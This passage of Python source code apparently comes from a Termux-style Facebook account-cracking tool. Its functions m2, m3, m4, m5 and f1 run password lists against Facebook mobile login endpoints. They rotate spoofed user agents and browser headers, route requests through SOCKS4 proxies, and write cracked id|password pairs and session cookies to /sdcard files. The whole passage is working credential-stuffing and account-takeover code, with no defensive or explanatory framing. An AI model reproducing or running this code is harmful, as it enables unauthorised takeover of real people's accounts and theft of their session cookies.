            'referer': f'p.facebook.com/?stype=lo&deoia=1&jlou=AfdQFB5eADwiqTXNYjdbVNcCqjHbqwlJnUkxEQKgRht-KT-dltaDjlYkOOwFn3XRSzOkMc1FrtgwFdlYK7iToE9zGeIAeRLtPf870J_d3n6pSw&smuh=31338&lh=Ac_AchkdbMqMbH8ej_o&wtsid=rdr_0mfo0SB1uxZP5ZXsw&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': f'{random.choice(["empty","document"])}',
            'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
            'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
            'sec-fetch-user': f'{random.choice(["?1","empty"])}',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,})
            

            yz = session.post(f'https://p.facebook.com/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
            if "checkpoint" in session.cookies.get_dict().keys():
             idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/ULTRA-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
            elif "c_user" in session.cookies.get_dict().keys():
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kukis)[0]
                ok+=1
                print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/ULTRA-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
def m2(idf,pwv):
 global loop,ok,cp
 animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
 sys.stdout.write(f'\r{P} [{animasi}-{H}M2{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
 sys.stdout.flush()
 ses = requests.Session()
 ua = random.choice(usragent)
 ua2 = random.choice(usragent)
 for pw in pwv:
  try:
   ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
   p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
   dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
   koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
   koki+=' m_pixel_ratio=2.625; wd=412x756'
   heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
   po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
   if "checkpoint" in po.cookies.get_dict().keys():
    idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'\n')
    ok.append(idf+'|'+pw)
    cp+=1
    break
   elif "c_user" in ses.cookies.get_dict().keys():
    coki=po.cookies.get_dict()
    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
    idf = re.findall('c_user=(.*);xs', kuki)[0]
    ok+=1
    print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
    if 'y' in cokix:
     print(f'\r{gen}{H}'+kuki)
    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'\n')
    break
   else:
    continue
  except requests.exceptions.ConnectionError:
   time.sleep(3)
 loop+=1




def m4(idx,pwv):
  global loop,ok,cp
 # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
  animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
  sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M4{P}] ({B}%s{P}){U}{gif}{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
  sys.stdout.flush()
  ua = random.choice(useragent)
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
      p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
      dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={
      "Host": "m.alpha.facebook.com",
      "content-length": f"{len(str(dataa))}",
      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
      "origin": "https://m.alpha.facebook.com",
      "content-type": "application/x-www-form-urlencoded",
      "user-agent": ua,
      "accept": "*/*",
      "x-requested-with": "com.microsoft.bing",
      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
      "sec-ch-ua-platform": '"Android"',
      "sec-ch-ua-mobile": "?1",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "sec-fetch-user": "?1",
      "referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
      "accept-encoding": "gzip, deflate br",
      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      }
      po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
        
      else:
        continue
    except requests.exceptions.ConnectionError:
      waktu(31)
  loop+=1

###----------[  FREE ]----------###
def f1(idf,pwv):
  global loop,ok,cp
  animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
  sys.stdout.write(f'\r{P} [{animasi}-{H}F1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
  sys.stdout.flush()
  ua = random.choice(usragent)
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
      p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DYqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo%26code_challenge_method%3DS256%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd614149f-136e-431f-babf-db7f365bce91%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
      dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={
      "Host": "m.facebook.com",
      "content-length": f"{len(str(dataa))}",
      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
      "origin": "https://m.facebook.com",
      "content-type": "application/x-www-form-urlencoded",
      "user-agent": ua, #'Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.15 Mobile Safari/537.36',
      "accept": "*/*",
      "x-requested-with": "com.microsoft.bing",
      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
      "sec-ch-ua-platform": '"Android"',
      "sec-ch-ua-mobile": "?1",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "sec-fetch-user": "?1",
      "referer": "https://m.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
      "accept-encoding": "gzip, deflate br",
      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      }
      po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      waktu(31)
  loop+=1

versi_android = random.randint(4,12)
versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
versi_app = random.randint(410000000,499999999)
device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/3;FBMF/huawei;FBBD/huawei;FBDV/{device.split(' Build')[0]};FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+str(density)+";]"


###----------[  MBASIC ]----------###



def m3(idf,pw):
 global loop
 global ok
 global agents
 animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
 sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M3{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
 try:
  for ps in pw:
   session = requests.Session()
   pro = random.choice(ugen)
   free_fb = session.get(f'https://free.facebook.com').text
   log_data = {
    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
   "try_number":"0",
   "unrecognized_tries":"0",
   "email":idf,
   "pass":ps,
   "login":"Log In"}
   header_freefb = {'authority':'web.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
   lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
    print('\r\033[1;32m [KING-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
   elif 'checkpoint' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    coki1 = coki.split("1000")[1]
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
  
 except:
  pass 
def m5(idf,pw):
 global loop
 global ok
 global agents
 animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
 sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M5{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
 try:
  for ps in pw:
   session = requests.Session()
            #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
            #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
            #sys.stdout.flush()
   pro = random.choice(ugen)
   free_fb = session.get('https://m.facebook.com').text
   log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":idf,
            "pass":ps,
            "login":"Log In"}
   header_freefb = {
            'authority': 'm.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://m.facebook.com',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
    print('\r\033[1;32m [KING-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
   elif 'checkpoint' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    coki1 = coki.split("1000")[1]
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
  
 except:
  pass 
mainx()

  